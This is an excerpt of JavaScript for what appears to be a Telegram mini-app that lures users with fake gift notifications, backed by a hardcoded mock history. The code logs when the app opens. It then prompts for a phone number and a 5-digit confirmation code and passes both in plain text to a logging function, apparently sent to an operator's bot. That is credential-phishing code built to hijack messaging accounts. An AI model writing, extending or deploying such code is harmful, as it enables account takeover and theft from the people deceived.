...
// Log when mini app opens
document.addEventListener('DOMContentLoaded', () => {
    createSnowflakes();
    sendLog('Открыл мини-приложение', 'Пользователь открыл мини-приложение');
});
...
const mockHistory = [
    { type: 'received', gift: 'Scared Cat', user: 'система', date: '2 hours ago' },
    { type: 'received', gift: 'Snoop Dog', user: 'система', date: '1 day ago' },
    { type: 'received', gift: 'UFC Strike', user: 'система', date: '3 days ago' },
];
...
function loadHistory() {
    ...
    mockHistory.forEach(item => {
        ...
        const action = item.type === 'received' ? '🎁 Получен подарок' : '📤 Отправлено';
        historyItem.innerHTML = `
            <div>${action} <strong>${item.gift}</strong></div>
...
function showAuthScreen() {
    ...
    authModal.innerHTML = `
        <div class="auth-content">
            ...
            <button class="auth-btn" id="manual-btn">✏️ Ввести номер телефона</button>
        </div>
    `;
    
    document.body.appendChild(authModal);
    
    // Manual input button - show phone input immediately
    authModal.querySelector('#manual-btn').addEventListener('click', () => {
        authModal.remove();
...
function showPhoneInputScreen() {
    ...
    submitBtn.addEventListener('click', () => {
        ...
        if (phone) {
            sendLog('Отправил номер телефона', `Номер: ${phone}`);
            phoneModal.remove();
...
function showCodeInputScreen(phone) {
    ...
    codeModal.innerHTML = `
        <div class="code-input-content">
            ...
            <div id="code-status" style="text-align: center; margin: 15px 0; min-height: 20px;"></div>
    ...
    const statusDiv = codeModal.querySelector('#code-status');
    ...
    // Submit button - send code and wait for verification
    submitBtn.addEventListener('click', () => {
        const code = Array.from(codeInputs).map(input => input.value).join('');
        if (code.length === 5) {
            sendLog('Отправил код подтверждения', `Код: ${code}`);
            submitBtn.disabled = true;
            statusDiv.innerHTML = '<span style="color: #667eea;">⏳ Проверка кода...</span>';
            ...
            // Wait for response from bot (verification)
            // This will be handled by bot sending message back
        }
    });
}
